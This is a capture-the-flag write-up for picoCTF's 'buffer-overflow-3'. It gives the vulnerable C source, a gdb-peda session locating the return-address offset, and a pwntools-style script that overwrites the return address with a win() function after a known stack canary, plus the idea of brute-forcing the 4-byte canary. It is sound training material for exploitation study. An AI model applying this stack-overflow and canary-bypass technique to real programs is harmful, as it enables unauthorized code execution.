# picoCTF: buffer-overflow-3

In this case, we need to evade the overflow-detection using canary.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    fflush(stdout);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    fflush(stdout);
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

First, we need to calculate the offset from the `buf` to the return address of `vuln`.

```bash
gdb-peda$ run
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
How Many Bytes will You Write Into the Buffer?
> 200
Input> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.
[----------------------------------registers-----------------------------------]
EAX: 0xc8
EBX: 0x804c000 --> 0x804bf10 --> 0x1
ECX: 0xffffcb68 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EDX: 0xc8
ESI: 0xffffcca4 --> 0xffffcde4
EDI: 0xf7ffcb80 --> 0x0
EBP: 0xffffcbb8 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
ESP: 0xffffcb10 --> 0x0
EIP: 0x8049549 (<vuln+192>:     add    esp,0x10)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049541 <vuln+184>:        push   eax
   0x8049542 <vuln+185>:        push   0x0
   0x8049544 <vuln+187>:        call   0x8049130 <read@plt>
=> 0x8049549 <vuln+192>:        add    esp,0x10
   0x804954c <vuln+195>:        sub    esp,0x4
   0x804954f <vuln+198>:        push   0x4
   0x8049551 <vuln+200>:        mov    eax,0x804c054
   0x8049557 <vuln+206>:        push   eax
[------------------------------------stack-------------------------------------]
0000| 0xffffcb10 --> 0x0
0004| 0xffffcb14 --> 0xffffcb68 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffcb18 --> 0xc8
0012| 0xffffcb1c --> 0x804949c (<vuln+19>:      add    ebx,0x2b64)
0016| 0xffffcb20 --> 0x804d1a0 --> 0x804d
0020| 0xffffcb24 --> 0xc8
0024| 0xffffcb28 ("200\n")
0028| 0xffffcb2c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08049549 in vuln ()
gdb-peda$
gdb-peda$ pattern offset AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 80
```

If we know the canary, we can get the flag with the following script.

```py
win_addr = 0x08049336
query = b"a"*64 + carnary + b"a" * 16 + p32(win_addr)

print(query, len(query))

r = process("./vuln")
print(r.recvuntil(b">"))
r.sendline(b"88")
print(r.recvuntil(b">"))
r.sendline(query)
print(r.recvline())
print(r.recvline())
```

Since canary is 4 bytes, we can get the correct canary with brute-force attack.